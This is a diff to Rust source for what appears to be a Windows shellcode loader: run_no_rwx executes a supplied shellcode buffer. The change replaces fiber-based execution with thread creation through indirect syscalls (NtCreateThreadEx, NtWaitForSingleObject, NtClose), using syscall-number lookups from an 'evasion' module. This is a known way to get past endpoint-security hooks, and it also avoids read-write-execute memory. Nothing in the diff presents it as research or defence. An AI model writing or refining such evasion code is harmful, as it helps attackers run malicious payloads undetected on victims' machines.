@@ -1,8 +1,5 @@
 #[cfg(target_os = "windows")]
-use windows_sys::Win32::System::{
-    Threading::{CreateFiber, ConvertThreadToFiber, SwitchToFiber, DeleteFiber},
-    Memory::{PAGE_EXECUTE_READ, PAGE_READWRITE},
-};
+use windows_sys::Win32::System::Memory::{PAGE_EXECUTE_READ, PAGE_READWRITE};
 
 #[cfg(target_os = "windows")]
 pub unsafe fn run_no_rwx(shellcode: &[u8]) {
@@ -45,15 +42,41 @@ pub unsafe fn run_no_rwx(shellcode: &[u8]) {
         0,
     );
 
-    let main_fiber = ConvertThreadToFiber(core::ptr::null());
-    let shell_fiber = CreateFiber(
+    let (ssn_thread, tramp_thread) = match get_ssn(b"NtCreateThreadEx") {
+        Some(v) => v,
+        None => return,
+    };
+    let mut h_thread: isize = 0;
+    let status = crate::evasion::syscalls::indirect_syscall_11(
+        ssn_thread, tramp_thread,
+        &mut h_thread as *mut isize as usize,
+        0x001F_FFFF_usize,
         0,
-        Some(core::mem::transmute(ptr as *const ())),
-        core::ptr::null_mut(),
+        usize::MAX,
+        ptr as usize,
+        0,
+        0,
+        0,
+        0,
+        0,
+        0,
     );
-    SwitchToFiber(shell_fiber);
-    DeleteFiber(shell_fiber);
-    let _ = main_fiber; // suppress unused warning
+    if status >= 0 && h_thread != 0 {
+        let (ssn_wait, tramp_wait) = match get_ssn(b"NtWaitForSingleObject") {
+            Some(v) => v,
+            None => return,
+        };
+        crate::evasion::syscalls::indirect_syscall(
+            ssn_wait, tramp_wait,
+            h_thread as usize, 0, 0, 0, 0, 0,
+        );
+        if let Some((ssn_close, tramp_close)) = get_ssn(b"NtClose") {
+            crate::evasion::syscalls::indirect_syscall(
+                ssn_close, tramp_close,
+                h_thread as usize, 0, 0, 0, 0, 0,
+            );
+        }
+    }
 }
 
 #[cfg(target_os = "windows")]
